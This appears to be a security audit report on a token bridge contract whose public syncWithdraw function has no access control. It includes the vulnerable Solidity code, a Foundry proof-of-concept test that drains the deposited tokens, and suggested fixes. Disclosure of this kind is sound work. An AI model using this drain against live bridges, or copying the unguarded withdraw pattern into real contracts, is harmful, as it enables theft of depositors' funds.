Unrestricted ```syncWithdraw``` Function Allows Unauthorized Token Withdrawals, Leading to Loss of Funds

Original Code
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SafeERC20, IERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract FxERC20RootTunnel {
    using SafeERC20 for IERC20;

    function deposit(address rootToken, uint256 amount) public {
        // transfer from depositor to this contract
        IERC20(rootToken).safeTransferFrom(
            msg.sender, // depositor
            address(this), // manager contract
            amount
        );
    }
    // exit processor
    function syncWithdraw(address rootToken, uint256 amount) public {
        // transfer from tokens to
        IERC20(rootToken).safeTransfer(msg.sender, amount);
    }
}
```

Summary
The ```syncWithdraw``` function in the ```FxERC20RootTunnel``` contract is public and lacks access control, allowing any user to withdraw arbitrary amounts of ERC20 tokens held by the contract. This critical vulnerability enables attackers to drain the contract's token balance, resulting in significant loss of funds for users who deposited tokens for cross-chain bridging.


Vulnerability Details
The ```FxERC20RootTunnel``` contract, designed to facilitate ERC20 token bridging between L1 and L2, includes a ```syncWithdraw``` function that transfers tokens from the contract to the caller using ```IERC20(rootToken).safeTransfer(msg.sender, amount)```. This function is marked as public with no access control or validation, meaning anyone can call it with any rootToken and amount to withdraw tokens, regardless of whether they have a legitimate claim (e.g., a corresponding burn on L2).

Relevant Code
```js
// File: FxERC20RootTunnel.sol
function syncWithdraw(address rootToken, uint256 amount) public {
    // transfer from tokens to
    IERC20(rootToken).safeTransfer(msg.sender, amount);
}
```
Attack Scenario

1. A user deposits 1000 ```BMWToken``` tokens into the contract via deposit, locking them for bridging to L2.

2. An attacker calls ```syncWithdraw(address(BMWToken), 1000)``` without any authorization or proof of a corresponding L2 burn.

3. The contract transfers 1000 ```BMWToken``` tokens to the attacker, draining the deposited funds.
The attacker repeats this for all tokens held by the contract, stealing the entire balance.

Root Cause

The ```syncWithdraw``` function lacks access control (e.g., ```onlyRelayer``` modifier or L2 message verification).

There is no validation to ensure the withdrawal is authorized, such as checking a state sync message from L2, as is standard in cross-chain bridges like Polygon’s FxPortal.

Impact

Financial Loss: Attackers can drain all ERC20 tokens held by the contract, resulting in a total loss of funds for legitimate depositors.

Bridge Integrity: The unauthorized withdrawals break the L1-L2 bridge's balance, allowing attackers to claim unbacked tokens on L1, undermining the protocol's trust and functionality.

Severity: High, as it leads to direct and complete loss of funds with no mitigation once exploited.

Proof of Concept (PoC)
The following test demonstrates the vulnerability using a Foundry test script:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/dev/FxERC20RootTunnel.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract BMWToken is ERC20 {
    constructor() ERC20("BeemerToken", "BMW") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract FxERC20RootTunnelTest is Test {
    FxERC20RootTunnel tunnel;
    BMWToken token;
    address user = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        tunnel = new FxERC20RootTunnel();
        token = new BMWToken();
        token.mint(user, 1000 * 10**18); // Mint 1000 tokens to user
        vm.prank(user);
        token.approve(address(tunnel), 1000 * 10**18);
    }

    function testUnauthorizedWithdraw() public {
        // User deposits 1000 tokens
        vm.prank(user);
        tunnel.deposit(address(token), 1000 * 10**18);

        // Attacker withdraws without authorization
        vm.prank(attacker);
        tunnel.syncWithdraw(address(token), 1000 * 10**18);

        // Verify attacker received tokens
        assertEq(token.balanceOf(attacker), 1000 * 10**18, "Attacker should have stolen tokens");
        assertEq(token.balanceOf(address(tunnel)), 0, "Contract should be drained");
    }
}
```
Execution:

Run forge test ```--match-path test/FxERC20RootTunnelTest.sol.```
The test shows the attacker successfully withdraws 1000 tokens, leaving the contract empty.

Tools Used

Manual code review

Foundry (for PoC development)

OpenZeppelin Contracts documentation (SafeERC20)

Polygon FxPortal documentation for bridge standards (FxPortal)

Recommended Mitigation

To prevent unauthorized withdrawals, implement the following:

1. Restrict ```syncWithdraw``` Access:

Add a modifier to restrict ```syncWithdraw``` to a trusted relayer or bridge contract.
Example:address public relayer;

```solidity
modifier onlyRelayer() {
    require(msg.sender == relayer, "Only relayer allowed");
    _;
}
function syncWithdraw(address rootToken, uint256 amount) public onlyRelayer {
    IERC20(rootToken).safeTransfer(msg.sender, amount);
}

```


2. Implement L2 Message Verification:

Verify L2 burn messages using a state sync mechanism (e.g., Polygon’s FxRoot).

Example:

```solidity
function syncWithdraw(address rootToken, uint256 amount, bytes calldata proof) public {
    require(verifyL2Proof(proof), "Invalid L2 proof");
    IERC20(rootToken).safeTransfer(msg.sender, amount);
}
```



3. Add Input Validation:

Validate rootToken and amount to prevent invalid or malicious inputs.
Example:

```solidity
require(rootToken != address(0), "Invalid token address");
require(amount > 0, "Amount must be greater than 0");

```


4. Emit Events:

Add events for transparency and auditability.

Example:

```solidity
event Withdrawn(address indexed user, address rootToken, uint256 amount);
function syncWithdraw(address rootToken, uint256 amount) public onlyRelayer {
    IERC20(rootToken).safeTransfer(msg.sender, amount);
    emit Withdrawn(msg.sender, rootToken, amount);
}
```



5. Use Access Control:

Inherit from ```Ownable``` to allow configuration of the relayer or pausing.

Example:

```solidity
import "@openzeppelin/contracts/access/Ownable.sol";
contract FxERC20RootTunnel is Ownable {
    function setRelayer(address _relayer) external onlyOwner {
        relayer = _relayer;
    }
}

```


6. Add Pause Mechenism:

Implement Puasable to halt withdrawals during exploits.

Example:
```solidity
import "@openzeppelin/contracts/security/Pausable.sol";
contract FxERC20RootTunnel is Ownable, Pausable {
    function pause() external onlyOwner { _pause(); }
    function syncWithdraw(...) public onlyRelayer whenNotPaused { ... }
}

```



Severity

High

Reasoning

Likelihood: High, as ```syncWithdraw``` is public and can be called by anyone at any time, requiring no special conditions or permisions.

Impact: High, as it allows attackers to drain all tokens held by the contract, leading to complete loss of deposited funds and breaking the bridge's integrity.

Classification: Per Code4rena guidelines, vulnerabilities causing direct loss of funds with high likelihood and impact are classified as High severity.

References

OpenZeppelin SafeERC20 Documentation

Polygon FxPortal Documentation

ERC20 Standard

Code4rena Audit Guidelines


